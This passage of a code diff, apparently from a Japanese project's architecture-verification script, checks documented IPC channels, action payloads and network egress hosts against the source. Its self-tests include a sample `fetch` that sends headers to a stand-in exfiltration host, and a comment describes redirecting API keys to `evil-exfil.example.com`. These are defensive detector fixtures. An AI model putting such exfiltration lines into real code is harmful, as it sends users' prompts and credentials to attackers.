+     * `wordpress.create-post` は実物が `create-post-draft` なのに、
+     * interface が古い名前に揃っていたので payload の比較は成功し、
+     * **名前が違うまま通っていた**。
+     */
+    [
+      '実在しない action 名は鳴る',
+      '| wordpress | `create-post` | `{ siteId, title, content, status }` | x | `wordpress.ts:1` |',
+      1,
+    ],
+    [
+      '実在する action 名なら鳴らない',
+      '| wordpress | `create-post-draft` | `{ siteId, title, content, status }` | x | `wordpress.ts:1` |',
+      0,
+    ],
+    /*
+     * **短縮記法 (`chat,`) の action も「実在する」と読む。**
+     * ここを落とすと `ollama.chat` が実在しない扱いになる (一度誤読した)。
+     */
+    [
+      '短縮記法で登録された action も実在と判定する',
+      '| ollama | `chat` | `{ model, prompt, system }` | x | `ollama.ts:1` |',
+      0,
+    ],
+    /*
+     * **台帳で別名を指定した行は通る。** 台帳を空にすると鳴るので、
+     * 「理由つきでしか許さない」が効いていることも同時に見ている。
+     */
+    [
+      '台帳に別名がある行 (atlassian) は通る',
+      '| atlassian | `create-issue` | `{ projectKey, summary, description, issueType }` | x | `atlassian.ts:1` |',
+      0,
+    ],
+  ];
+  for (const [label, doc, want] of payloadCases) {
+    const got = verifyActionPayloads(doc).failures.length;
+    const ok = got === want;
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} payload: ${label}: ${got} 件 (期待 ${want})`);
+  }
+
+  /*
+   * **網羅の検査そのものに標本を通す。**
+   *
+   * 「行が無い action を見つける」は不在を主張する検査なので、実物に対して
+   * 緑でも空虚でありうる。空の文書を渡せば**登録されている全部**が鳴り、
+   * 実物の文書を渡せば 0 件になる —— どちらへ動いても差が出ることを見る。
+   */
+  const coverageCases = [
+    ['空の文書なら登録済み action の数だけ鳴る', '', (n) => n > 40],
+    [
+      '実物の文書なら鳴らない',
+      readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '',
+      (n) => n === 0,
+    ],
+    [
+      '1 行だけ消すと、その 1 件が鳴る',
+      (readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '').replace(
+        /^\| shopify \| `sync-to-salesforce` \|.*$/m,
+        '',
+      ),
+      (n) => n === 1,
+    ],
+  ];
+  for (const [label, doc, want] of coverageCases) {
+    const got = verifyActionCoverage(doc).failures.length;
+    const ok = want(got);
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} coverage: ${label}: ${got} 件`);
+  }
+
+  /*
+   * **IPC チャンネルの網羅にも標本を通す。**
+   */
+  const channelCases = [
+    ['表が空なら登録済みチャンネルが全部鳴る', '', (n) => n === 15],
+    [
+      '実物の文書なら鳴らない',
+      readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '',
+      (n) => n === 0,
+    ],
+    [
+      '1 行だけ消すと、その 1 件が鳴る',
+      (readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '').replace(
+        /^\| `app:openPath` \|.*$/m,
+        '',
+      ),
+      (n) => n === 1,
+    ],
+  ];
+  for (const [label, doc, want] of channelCases) {
+    const got = verifyIpcChannels(doc).failures.length;
+    const ok = want(got);
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} ipc: ${label}: ${got} 件`);
+  }
+
+  /*
+   * **egress の網羅にも標本を通す。**
+   *
+   * 「表に無い宛先を見つける」も不在の主張なので、実物に対して緑でも
+   * 空虚でありうる。表を空にすれば**字面で書かれた全部**が鳴り、実物なら
+   * 0 件になる。1 行消せばその 1 件だけが鳴る。
+   */
+  const egressCases = [
+    ['表が空なら字面の宛先が全部鳴る', '### 3.3 ネットワーク egress\n', (n) => n > 15],
+    [
+      '実物の文書なら鳴らない',
+      readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '',
+      (n) => n === 0,
+    ],
+    [
+      '1 行だけ消すと、その 1 件が鳴る',
+      (readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '').replace(
+        /^\| microsoft-365 \| `graph\.microsoft\.com`.*$/m,
+        '',
+      ),
+      (n) => n === 1,
+    ],
+  ];
+  for (const [label, doc, want] of egressCases) {
+    const got = verifyEgressHosts(doc).failures.length;
+    const ok = want(got);
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} egress: ${label}: ${got} 件`);
+  }
+
+  /*
+   * **送信文脈の規則そのものに標本を通す** (2026-09-09)。上の 3 件は実物の木を読むので、
+   * 「renderer の fetch が数えられる」「引用の URL は数えない」という規則の両側は、合成の
+   * 標本でしか確かめられない。2 件目は `api.cursor.com` が 2026-09-09 まで台帳の外にいた
+   * 実在の形 (shared の ALL_CAPS 定数 + jsonFetch)。
+   */
+  const archNow = readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md')) ?? '';
+  const sampleCases = [
+    ['renderer の素の fetch に台帳に無い宛先 → 鳴る', [{ rel: 'src/renderer/network/x.ts', text: "await fetch('https://exfil.example/x', { headers });" }], 1],
+    ['★ shared の ALL_CAPS 定数を経由した jsonFetch → 鳴る (cursor の形)', [{ rel: 'src/shared/api/z.ts', text: "const API = 'https://zzz.example';\nexport async function f(jsonFetch) {\n  return jsonFetch(`${API}/x`);\n}" }], 1],
+    ['引用・出典の URL (送信の呼び出しが無い) → 数えない', [{ rel: 'src/renderer/data/k.ts', text: "export const K = [{ title: 'x', url: 'https://cite.example/paper' }];" }], 0],
+    ['案内リンク (openExternal) → 数えない', [{ rel: 'src/renderer/pages/P.tsx', text: "void window.serviceHub.openExternal('https://help.example/');" }], 0],
+    ['.tsx の fetch も読む', [{ rel: 'src/renderer/pages/P.tsx', text: "const r = await fetch('https://page.example/api');" }], 1],
+    ['main は送信文脈に無くても字面で数える (従来どおり)', [{ rel: 'src/main/clients/q.ts', text: "const LINK = 'https://link.example/help';" }], 1],
+    ['台帳に在る宛先なら鳴らない', [{ rel: 'src/renderer/network/x.ts', text: "await fetch('https://api.github.com/user');" }], 0],
+    ['コメントの中の URL は数えない', [{ rel: 'src/renderer/network/x.ts', text: "// await fetch('https://old.example/x')\nawait fetch(url);" }], 0],
+    ['4 行より前の呼び出しは文脈に入らない', [{ rel: 'src/renderer/network/x.ts', text: "await fetch(url);\n\n\n\nconst doc = 'https://far.example/';" }], 0],
+    ['一覧の別名 (timedFetch) も送信', [{ rel: 'src/renderer/web-shim.ts', text: "const res = await timedFetch('https://shim.example/x', init);" }], 1],
+  ];
+  for (const [label, sample, expected] of sampleCases) {
+    const got = verifyEgressHosts(archNow, sample).failures.length;
+    const ok = got === expected;
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} egress (送信文脈): ${label}: ${got} 件 (期待 ${expected})`);
+  }
+
+  /*
+   * **`readonly` の欄を読めること。** 2026-09-01 まで読めておらず、
+   * `readonly` で書かれた payload interface は欄が空集合になっていた。
+   */
+  const readonlyCase = verifyActionPayloads(
+    '| real-estate | `record-entry` | `{ note, amount }` | x | `real-estate.ts:1` |',
+  ).failures.length;
+  const readonlyOk = readonlyCase === 0;
+  if (!readonlyOk) failed += 1;
+  console.log(
+    `  ${readonlyOk ? '✓' : '✗'} payload: readonly の欄を読む: ${readonlyCase} 件 (期待 0)`,
+  );
+
+  /*
+   * **式で組み立てた ACTIONS も読めること。** `shopify.ts` の 7 件は
+   * 2026-09-01 まで「静的に読めない」として数から落ちており、どの台帳にも
+   * 載っていなかった (連携先の資格情報を payload で受け取る action である)。
+   */
+  const shopifySrc = readFileSafe(path.join(REPO_ROOT, 'src/main/clients/shopify.ts')) ?? '';
+  const shopifyNames = readActionNames(shopifySrc);
+  const shopifyOk = shopifyNames !== null && shopifyNames.has('sync-to-salesforce');
+  if (!shopifyOk) failed += 1;
+  console.log(
+    `  ${shopifyOk ? '✓' : '✗'} coverage: 導出された ACTIONS も読む: ${shopifyNames === null ? 'null' : shopifyNames.size + ' 件'}`,
+  );
+
+  if (failed > 0) {
+    console.error(`❌ self-test ${failed} 件失敗 — 規則が壊れています`);
+    return 1;
+  }
+  console.log('✅ self-test 全件一致');
+  return 0;
+}
+
+// ---------------------------------------------------------------------------
 // Run
 // ---------------------------------------------------------------------------
 
+/**
+ * IPC action 表の payload 欄が、実装の `*Payload` interface と一致するか。
+ *
+ * ## なぜ要るか (2026-08-23)
+ *
+ * この表は「**レンダラーから main へ何が渡るか**」を示す唯一の一覧である。
+ * 実装と食い違うと、読んだ人は攻撃面を誤解する。実際に 6 行ずれていた:
+ *
+ *   - `skills.run-skill` に `model` / `maxTokens` が残っていた
+ *     (payload から外したのに表が古いまま)
+ *   - `cloudflare.purge-cache` に **`purgeEverything`** が載っていなかった
+ *     —— ゾーン全体のキャッシュを落とす破壊的なフラグ
+ *   - `wordpress.create-post` に `status` (publish 指定) が載っていなかった
+ *   - `github` の `labels` / `calendar` の `location`,`timeZone` /
+ *     `cloudflare` の `proxied` も欠けていた
+ *
+ * 行番号のずれ (`verify:arch` の既存機能) は捕まえられても、**中身のずれ**は
+ * 誰も見ていなかった。
+ *
+ * ## 判定
+ *
+ * 表の `` `{ a, b?, c }` `` を実装の `interface XxxPayload` と集合で比べる。
+ * action 名から interface 名を導く (`create-issue` → `CreateIssuePayload`)。
+ * 対応する interface が無い action は対象外 (静的スタブなど)。
+ * コメント行は落としてからフィールド名を取る —— 型注釈の中の `//` に
+ * 引っかかると存在しない欄を報告する。
+ */
+/**
+ * 実在する action 名を `export const ACTIONS = { ... }` から読む。
+ * `'k': fn` / `k: fn` / 短縮記法 `fn,` の 3 通りを拾う ——
+ * **短縮記法を落とすと `ollama.chat` が「実在しない」に見える**
+ * (実際に一度そう誤読した)。静的に読めない形 (`Object.fromEntries` で
+ * 組み立てる shopify) は `null` を返し、名前の検査を見送る。
+ */
+function readActionNames(src) {
+  // 空の 1 行形 (`= {};`) は「action 0 件」であって「読めない」ではない。
+  // 分けないと `cursor.ts` が静的に読めない側へ数えられる (2026-09-01)。
+  if (/export const ACTIONS[^=]*=\s*\{\s*\};/.test(src)) return new Set();
+
+  const m = /export const ACTIONS[^=]*=\s*\{([\s\S]*?)\n\};/.exec(src);
+  if (m === null) {
+    /*
+     * **式で組み立てる形も読む。** `shopify.ts` は
+     * `Object.fromEntries(CONNECTORS.map((c) => [c.action, c.run]))` で
+     * ACTIONS を導出するので、上の正規表現では読めない ——
+     * その結果 7 件 (`sync-to-slack` … `sync-to-stripe`) が
+     * **どの台帳にも載らないまま**になっていた (2026-09-01 に発見)。
+     * どれも連携先の資格情報 (`token` / `webhookUrl` ほか) を payload で
+     * 受け取る、いちばん見える所に置くべき action である。
+     *
+     * 導出元の登録表に在る `action: '…'` を action 名として読む。
+     */
+    if (!/export const ACTIONS[^=]*=\s*Object\.fromEntries/.test(src)) return null;
+    const derived = new Set([...src.matchAll(/\baction:\s*'([^']+)'/g)].map((x) => x[1]));
+    return derived.size > 0 ? derived : null;
+  }
+  const body = m[1];
+  const names = new Set();
+  for (const x of body.matchAll(/^\s*'([^']+)'\s*:/gm)) names.add(x[1]);
+  for (const x of body.matchAll(/^\s*([A-Za-z_]\w*)\s*:/gm)) names.add(x[1]);
+  for (const x of body.matchAll(/^\s*([A-Za-z_]\w*)\s*,\s*$/gm)) names.add(x[1]);
+  return names;
+}
+
+/**
+ * action 名から payload の interface 名を導けない所の台帳。
+ * **理由つきでしか許さない** —— 空にすると「interface が見つからない」行が
+ * 黙って検査対象から外れる。
+ */
+const PAYLOAD_INTERFACE_OVERRIDES = {
+  // Jira の課題であることを型名で示している。action 名は Atlassian 製品
+  // 横断の総称なので、両方をそのまま残すのが正しい。
+  'atlassian.create-issue': 'CreateJiraIssuePayload',
+
+  // --- 2026-09-01 追加 (表を全 action へ広げたときに要った分) ---
+
+  // 1 つの payload を複数の action が共用している所。**別名ではなく共用**
+  // なので、型を action ごとに割るほうがむしろ嘘になる。
+  'assistant.chatAll': 'ChatPayload',
+  'stocks.unregister-ticker': 'RegisterTickerPayload',
+  'business.export-dashboard': 'ExportPayload',
+  'business.export-dashboard-md': 'ExportPayload',
+  'stocks.export-dashboard': 'ExportPayload',
+  'stocks.export-dashboard-md': 'ExportPayload',
+
+  // 型名が「何をするか」ではなく「誰が使うか」で付いている所。
+  'business.advise': 'BusinessAdvisorPayload',
+  'stocks.advise': 'AdvisorPayload',
+
+  // `templates.ts` の中では書き出しが 1 種類しかないので `ExportPayload`。
+  'templates.export-template': 'ExportPayload',
+};
+
+/**
+ * **`ipcMain.handle` の全チャンネルが IPC 契約表 (§1.4) に載っているか。**
+ *
+ * ## なぜ要るか (2026-09-01)
+ *
+ * §1.4 は renderer と main の境界そのものの一覧である。実測したら
+ * **13 本のうち表に在ったのは 9 本**で、見出しは「(9 チャンネル)」と
+ * 書いてあった (TL;DR の指標は 13 と書いてあり、同じ文書の中で食い違っていた)。
+ *
+ * 抜けていた 4 本には **`app:openPath` / `app:revealInFolder`** が含まれる ——
+ * renderer が渡したパスを OS の「開く」動詞に渡す口で、その関門
+ * (`shellOpenGate.ts`) は変異検査の `MUST_MEASURE` にも改竄検知の保護対象にも
+ * 入っている。**守りは最重要扱いなのに、守られている口が表に無かった。**
+ */
+function verifyIpcChannels(archText) {
+  const failures = [];
+  const src = readFileSafe(path.join(REPO_ROOT, 'src/main/main.ts')) ?? '';
+  // `ipcMain.handle('x'` と、名前が次の行に来る形の両方を読む。
+  const registered = new Set(
+    [...src.matchAll(/ipcMain\.handle\(\s*'([^']+)'/g)].map((m) => m[1]),
+  );
+  /*
+   * **§1.4 の中だけを見る。** 最初は文書全体から拾っていたが、
+   * `app:openPath` は §8 の「直した欠陥」表にも行があるので、
+   * §1.4 から消しても「載っている」ままだった —— **自己検査が捕まえた**
+   * (「1 行消すとその 1 件が鳴る」が 0 件だった)。
+   * 節を跨いで数えると、契約表の網羅を確かめたことにならない。
+   */
+  const lines = archText.split('\n');
+  const start = lines.findIndex((l) => l.startsWith('### 1.4 IPC 契約'));
+  let end = start + 1;
+  while (end < lines.length && !lines[end].startsWith('### ')) end += 1;
+  const section = start < 0 ? '' : lines.slice(start, end).join('\n');
+  const documented = new Set(
+    [...section.matchAll(/^\| `([a-z]+:[A-Za-z]+)` \|/gm)].map((m) => m[1]),
+  );
+  for (const ch of [...registered].sort()) {
+    if (!documented.has(ch)) {
+      failures.push({
+        ref: ch,
+        reason: 'IPC 契約表 (§1.4) に行がありません — 引数・戻り値・検証を書くこと',
+      });
+    }
+  }
+  return { failures, registered: registered.size };
+}
+
+/**
+ * **`src/main/**` に字面で書かれた宛先が、egress マトリクス (§3.3) に載っているか。**
+ *
+ * ## なぜ要るか (2026-09-01)
+ *
+ * §3.3 は「**下記以外のホストへの接続は存在しない**」という**絶対の否定**を
+ * 主張している。資格情報がどこへ出ていきうるかの唯一の一覧なので、これが
+ * 嘘だと読んだ人は攻撃面を狭く見積もる。
+ *
+ * 実測したら **11 ホストが載っていなかった** —— `graph.microsoft.com`
+ * (Bearer で送受信)、shopify コネクタの `api.line.me` / `api.stripe.com` /
+ * `discord.com` (どれも payload で受け取った資格情報を載せる)、`freee` /
+ * `base` の API、OAuth のトークン端点 3 つ。表は「15 ホスト」と数えていた。
+ *
+ * `lint:network-targets` は「**送り先が変数で決まる**通信」を見張る。
+ * こちらはその裏 —— **字面で書いてある宛先が台帳に在るか**。両方要る。
+ *
+ * ## 判定
+ *
+ * `src/main/**` の実行コード (コメントを落とす) から `https?://<host>` を集め、
+ * §3.3 の Host 欄か、下の除外台帳に在ることを求める。
+ *
+ * ## 2026-09-09 の追記 —— ブラウザ版が走査の外だった
+ *
+ * 上の走査は `src/main` だけで、`src/shared` / `src/renderer` (ブラウザ版はここから
+ * 直接送る) は誰も見ていなかった。実測: `api.cursor.com` (Admin API キーを Bearer で
+ * 載せる。両ビルドで送る) が `src/shared/api/cursor.ts` の ALL_CAPS 定数に在り、§3.3 に
+ * 無かった —— 「下記以外のホストへの接続は存在しない」は嘘だった。`docs/SECURITY_AUDIT.md`
+ * は同じ表の手書きの写し (12 行) をさらに古いまま持っていた (`lint:docs` が写しを禁じる)。
+ * 走査は `src` 全体になり、shared / renderer は送信文脈だけを数える (下の
+ * `egressHostsInFile` の注記)。
+ */
+const EGRESS_NOT_FETCHED = {
+  'www.youtube.com': '画面に出す視聴 URL を組み立てるだけ (youtube.ts)。main は fetch しない',
+  'www.w3.org': 'SVG / XML の名前空間 URI。通信しない',
+  localhost: 'OAuth の loopback 受け口の説明とローカル開発用。外向きではない',
+  'x.atlassian.net': '検査・注記で使う例示のサイト名 (実際の宛先は `*.atlassian.net` として表に在る)',
+  'attacker.example': '検査の標本 (送り先を絞っていることを確かめるための偽ホスト)',
+};
+
+/**
+ * §3.3 の Host 欄に載っている宛先の集合。
+ *
+ * **egress の照合と「何件あるか」の指標が同じ 1 つの解析を使う。** 2026-09-07 に
+ * 数え方を 2 つ持っていたせいで、同じ事実に 4 つの数字が並んでいた:
+ * 指標表が 14 + ローカル 1、§3.3 の見出しが 26、ゲートの実測が 29。
+ * 数を出す場所を分けると、必ずどれかが古くなる。
+ */
+function documentedEgressHosts(archText) {
+  const lines = archText.split('\n');
+  const start = lines.findIndex((l) => l.startsWith('### 3.3 ネットワーク egress'));
+  if (start < 0) return new Set();
+  let end = start + 1;
+  while (end < lines.length && !lines[end].startsWith('### ')) end += 1;
+  const documented = new Set();
+  for (const row of lines.slice(start, end)) {
+    if (!row.startsWith('| ') || row.startsWith('|---')) continue;
+    const host = row.split(' | ')[1] ?? '';
+    // `:port` 付きの表記も host として読む (`` `127.0.0.1:11434` `` が在る)。
+    for (const m of host.matchAll(/`\*?\.?([A-Za-z0-9.-]+)(?::\d+)?`/g)) documented.add(m[1]);
+    for (const m of host.matchAll(/\*\.([A-Za-z0-9.-]+)/g)) documented.add(m[1]);
+  }
+  return documented;
+}
+
+/**
+ * §8.1 の不変条件の行数 (行頭の番号で数える)。
+ *
+ * 見出しの「N 個」と指標表の数と**実際の行数**の 3 つが揃っているかを見るため。
+ * 2026-09-07 実測では 16 行あるのに両方 15 と書いてあった (#16 を足した人が
+ * どちらの数も直していない)。
+ */
+function invariantRowCount(archText) {
+  const lines = archText.split('\n');
+  const start = lines.findIndex((l) => l.startsWith('### 8.1 '));
+  if (start < 0) return null;
+  let end = start + 1;
+  while (end < lines.length && !/^(### |## )/.test(lines[end])) end += 1;
+  let max = 0;
+  for (const row of lines.slice(start, end)) {
+    const m = /^\| (\d+) \|/.exec(row);
+    if (m) max = Math.max(max, Number(m[1]));
+  }
+  return max === 0 ? null : max;
+}
+
+/**
+ * **送信文脈の宛先** (`src/shared` / `src/renderer` 用)。
+ *
+ * この 2 つの木は引用・出典・案内リンクの URL を何千件も持つ (学術コーパス・法令・
+ * 相談窓口) ので、`src/main` のように字面を全部数えると台帳が引用で埋まる。そこで
+ * 「その行か直前 3 行に送信の呼び出し (`NETWORK_CALL_NAMES` —— lint-network-targets と
+ * 同じ 1 つの一覧) があるか、その行が使う ALL_CAPS の定数が URL を持つか」で絞る。
+ *
+ * ## 限界 (書かずに置くと「見張っているつもり」になる)
+ *
+ * 組み立て (`url: \`${base}/…\``) と送信 (`f(httpReq.url)`) を別モジュールに分けた形
+ * (`shared/ai/providers.ts`) はここでは拾わない —— あちらは宛先が利用者の設定で決まる
+ * ので、どう絞っているかを `lint:network-targets` の台帳 (`REVIEWED`) が 1 件ずつ持つ。
+ * `const u = 'https://…'; fetch(u)` のように小文字の変数へ一度置いた形も拾わない。
+ *
+ * **2026-09-15 (パス 270) に、その穴の中を実測した: 0 件。** src/main・src/shared・
+ * src/renderer を走査し、小文字 (camelCase) の `const`/`let`/`var` が URL リテラルを
+ * 持ち、その名前が送信の呼び出しと同じ行に現れる形を数えた —— 1 件も無い。
+ * テンプレートリテラル版は 1 件だけ在るが `oauth.ts` の `redirectUri` = 127.0.0.1
+ * (ループバックの受け口で、宛先ではない。`src/main` は字面を全部数える木なので
+ * そもそも台帳に載っている)。**書いてあるだけの限界は、測るまで大きさが分からない。**
+ */
+const SEND_CONTEXT_LINES = 3;
+const SEND_CALL = new RegExp(`\\b(?:${NETWORK_CALL_NAMES.join('|')})\\s*(?:<[^<>]*>)?\\(`);
+/**
+ * **宛先を宣言する欄** —— 送信の呼び出しが近くに無くても、ここに書かれた URL は宛先である
+ * (2026-09-20 · パス 340)。
+ *
+ * `src/shared/ai/providers.ts` は提供者ごとの表で `defaultBaseUrl` を持ち、実際の
+ * `fetch` はその値を**別の関数が**受け取って呼ぶ。送信文脈 (前後 3 行に `NETWORK_CALL_NAMES`)
+ * では**この 4 件が 1 つも映らなかった** —— 実測 (2026-09-20): `api.anthropic.com` /
+ * `api.openai.com` / `generativelanguage.googleapis.com` / `127.0.0.1:11434` の 4 つとも
+ * §3.3 に在るのに、走査は見つけていなかった。**対照**: `api.openai.com` を
+ * `evil-exfil.example.com` に書き換えても `verify:arch` は緑のまま通った ——
+ * つまり「提供者を 1 つ足す」だけで、**利用者のプロンプトと API キーの送り先**が
+ * 台帳の外へ出られた。
+ *
+ * 欄の名前で絞る理由: `src/shared` / `src/renderer` には「画面に出すリンク」の URL が
+ * 大量に在る (実測: `url` 19 / `viewUrl` 12 / `sourceUrl` 9 / `helpUrl` 8 …)。
+ * それらは**宛先ではない**ので、送信文脈の設計 (引用で台帳を埋めない) を壊さないよう
+ * **「既定の送り先」と名乗る欄だけ**を足す。実測でこの形は `defaultBaseUrl` の
+ * 4 件 / 1 ファイルだけである。
+ */
+const DESTINATION_FIELD = /\bdefaultBaseUrl\s*:/;
+const HOST_LITERAL = /https?:\/\/([A-Za-z0-9._-]+)/g;
+const URL_CONST = /\bconst ([A-Z][A-Z0-9_]*)\s*(?::\s*string)?\s*=\s*['"`]https?:\/\/([A-Za-z0-9._-]+)/;
+
+/**
+ * コメントを落とした**行の配列**。行数は保つ —— 文脈の窓が行で数えるため。
+ *
+ * 2026-09-25 (パス 463) まで自前の正規表現で、`globSync(['src/main/**' + '/*.ts'])`
+ * のような**文字列の中の `/**`** から注記が始まったことにして次の閉じまで食っていた
+ * (パス 462 の実測で 42 本 / 1,274 行)。共有の字句解析器へ寄せた。
+ */
+function codeLines(src) {
+  return stripComments(src).split('\n');
+}
+
+/** 1 ファイル分の宛先。`mode` は `'all'` (字面を全部) か `'send'` (送信文脈だけ)。 */
+function egressHostsInFile(text, mode) {
+  const code = codeLines(text);
+  const hosts = new Set();
+  if (mode === 'all') {
+    for (const m of code.join('\n').matchAll(HOST_LITERAL)) hosts.add(m[1]);
+    return hosts;
+  }
+  const consts = new Map();
+  for (const line of code) {
+    const m = URL_CONST.exec(line);
+    if (m) consts.set(m[1], m[2]);
+  }
+  for (let i = 0; i < code.length; i++) {
+    const ctx = code.slice(Math.max(0, i - SEND_CONTEXT_LINES), i + 1).join('\n');
+    // 宛先を宣言する欄 (`defaultBaseUrl`) は、その行だけで送信文脈とみなす。
+    if (!SEND_CALL.test(ctx) && !DESTINATION_FIELD.test(code[i])) continue;
+    for (const m of code[i].matchAll(HOST_LITERAL)) hosts.add(m[1]);
+    for (const [name, host] of consts) {
+      if (new RegExp(`\\b${name}\\b`).test(code[i])) hosts.add(host);
+    }
+  }
+  return hosts;
+}
+
+/** 走査する木と、その木での数え方。`src/main` は全字面 (2026-09-01 から)、残りは送信文脈 (2026-09-09 から)。 */
+const EGRESS_TREES = [
+  { dir: 'src/main', mode: 'all', ext: /\.ts$/ },
+  { dir: 'src/shared', mode: 'send', ext: /\.tsx?$/ },
+  { dir: 'src/renderer', mode: 'send', ext: /\.tsx?$/ },
+];
+
+function* walkEgressTree(dir, ext) {
+  for (const name of fs.readdirSync(dir).sort()) {
+    const p = path.join(dir, name);
+    if (fs.statSync(p).isDirectory()) {
+      if (name !== '__tests__') yield* walkEgressTree(p, ext);
+    } else if (ext.test(name)) {
+      yield p;
+    }
+  }
+}
+
+/**
+ * `sample` を渡すと木を歩かず、その `{ rel, text }` の並びを同じ規則 (木ごとの数え方と
+ * 拡張子) で読む —— self-test が合成の標本を流すため。規則は 1 つ、入口が 2 つ。
+ */
+function verifyEgressHosts(archText, sample) {
+  const failures = [];
+  const documented = documentedEgressHosts(archText);
+
+  const found = new Map();
+  const note = (host, rel) => {
+    if (!found.has(host)) found.set(host, new Set());
+    found.get(host).add(rel);
+  };
+  if (sample) {
+    for (const { rel, text } of sample) {
+      const tree = EGRESS_TREES.find((t) => rel.startsWith(`${t.dir}/`));
+      if (!tree || !tree.ext.test(rel)) continue;
+      for (const host of egressHostsInFile(text, tree.mode)) note(host, rel);
+    }
+  } else {
+    for (const tree of EGRESS_TREES) {
+      for (const p of walkEgressTree(path.join(REPO_ROOT, tree.dir), tree.ext)) {
+        const rel = path.relative(REPO_ROOT, p).split(path.sep).join('/');
+        for (const host of egressHostsInFile(readFileSafe(p) ?? '', tree.mode)) note(host, rel);
+      }
+    }
+  }
+
+  for (const [host, files] of [...found].sort()) {
+    if (documented.has(host)) continue;
+    if (Object.prototype.hasOwnProperty.call(EGRESS_NOT_FETCHED, host)) continue;
+    // `*.salesforce.com` のような接尾辞での登録を許す。
+    if ([...documented].some((d) => host === d || host.endsWith(`.${d}`))) continue;
+    failures.push({
+      ref: host,
+      reason: `egress マトリクス (§3.3) に無い宛先です (${[...files].join(', ')}) — 表に足すか、通信しない理由を EGRESS_NOT_FETCHED へ`,
+    });
+  }
+  return { failures, scanned: found.size, documented: documented.size };
+}
+
+/**
+ * **登録済みの action が 1 つ残らず payload 表に載っているか。**
+ *
+ * ## なぜ要るか (2026-09-01)
+ *
+ * 下の `verifyActionPayloads` は**表に在る行**しか見ない。裏を返すと、
+ * **表に書かなければ何も言われない。** 実測すると、`ACTIONS` に登録された
+ * 47 件のうち表に在ったのは **19 件**で、節の見出しは「(19 actions)」と
+ * 書いてあった —— つまり読む人には*それが全部*に見えた。
+ *
+ * 載っていなかった 28 件には、有料 LLM API を叩くもの (`*.advise` 6 件 +
+ * `assistant.chat` / `chatAll`) と、renderer が渡したパスへ**ファイルを書く**
+ * もの (`export-*` 5 件・`save-state` 2 件) が含まれる。
+ * この表は「レンダラーから main へ何が渡るか」を示す唯一の一覧なので、
+ * 攻撃面の半分が見えていなかったことになる。
+ *
+ * `scripts/lint-mutation-scope.cjs` の `MUST_MEASURE` と同じ形の直し ——
+ * **台帳をすり抜ける道 (載せない) を塞ぐ。**
+ */
+function verifyActionCoverage(archText) {
+  const failures = [];
+  const documented = new Set(
+    [...archText.matchAll(/^\| ([\w-]+) \| `([\w-]+)` \|/gm)].map((m) => `${m[1]}.${m[2]}`),
+  );
+  const dir = path.join(REPO_ROOT, 'src/main/clients');
+  let registered = 0;
+  const unreadable = [];
+  for (const file of fs.readdirSync(dir).sort()) {
+    if (!file.endsWith('.ts')) continue;
+    const svc = file.replace(/\.ts$/, '');
+    const src = readFileSafe(path.join(dir, file));
+    if (src === null || !src.includes('ACTIONS')) continue;
+    const names = readActionNames(src);
+    if (names === null) {
+      // 静的に読めない形 (`Object.fromEntries` で組み立てる等)。
+      // **黙って飛ばさず数える** —— 増えたら見える。
+      if (/export const ACTIONS/.test(src)) unreadable.push(svc);
+      continue;
+    }
+    for (const action of names) {
+      registered += 1;
+      if (!documented.has(`${svc}.${action}`)) {
+        failures.push({
+          ref: `${svc}.${action}`,
+          reason: 'payload 表 (§3.2) に行がありません — 何が renderer から渡るかを書くこと',
+        });
+      }
+    }
+  }
+  return { failures, registered, unreadable };
+}
+
+function verifyActionPayloads(archText) {
+  const failures = [];
+  let checked = 0;
+  const rowRe = /^\| ([\w-]+) \| `([\w-]+)` \| `\{([^}]*)\}` \|/gm;
+  let m;
+  while ((m = rowRe.exec(archText)) !== null) {
+    const [, svc, action, fields] = m;
+    const archLine = archText.slice(0, m.index).split('\n').length;
+    const src = readFileSafe(path.join(REPO_ROOT, 'src/main/clients', `${svc}.ts`));
+    if (src === null) continue;
+
+    /*
+     * **まず action 名が実在するか。** これが無いと、名前が古いまま
+     * payload だけ一致していれば通ってしまう。実際に `wordpress.create-post`
+     * が (実物は `create-post-draft`) そのまま通っていた ——
+     * interface 名が古いほうに揃っていたので、payload の比較は成功していた。
+     */
+    const realActions = readActionNames(src);
+    if (realActions !== null && !realActions.has(action)) {
+      failures.push({
+        archLine,
+        ref: `${svc}.${action}`,
+        reason: `そんな action は登録されていません (実在: ${[...realActions].sort().join(', ')})`,
+      });
+      continue;
+    }
+
+    const override = PAYLOAD_INTERFACE_OVERRIDES[`${svc}.${action}`];
+    const camel =
+      override ??
+      action.split('-').map((w) => w[0].toUpperCase() + w.slice(1)).join('') + 'Payload';
+    const im = new RegExp(`interface ${camel}\\s*\\{([^}]*)\\}`).exec(src);
+    if (im === null) {
+      // **黙って飛ばさない。** 飛ばすと、文書がいちばん間違っているとき
+      // (名前が違う) にこそ検査が効かなくなる。
+      failures.push({
+        archLine,
+        ref: `${svc}.${action}`,
+        reason: `payload の interface ${camel} が見つかりません (別名なら PAYLOAD_INTERFACE_OVERRIDES に理由つきで足す)`,
+      });
+      continue;
+    }
+    checked += 1;
+    // 注記は共有の字句解析器で落とす (行末の注記も落ちる)。
+    const body = stripComments(im[1]);
+    /*
+     * **`readonly` を飛ばしてから欄名を取る。**
+     *
+     * 2026-09-01 まで `/^\s*(\w+)\??:/` だったので、`readonly note: string;`
+     * からは**何も取れなかった** (`readonly` の直後が空白で `:` が来ない)。
+     * つまり `readonly` で書かれた payload interface は欄が空集合になり、
+     * 文書が何を書いていても「文書にだけ在る」と報告されるか、文書も空なら
+     * **何も比べずに通る**。このリポジトリの他の interface は `readonly` を
+     * 使うのが普通なので、次に payload をそう書いた日に黙る。
+     */
+    const real = new Set(
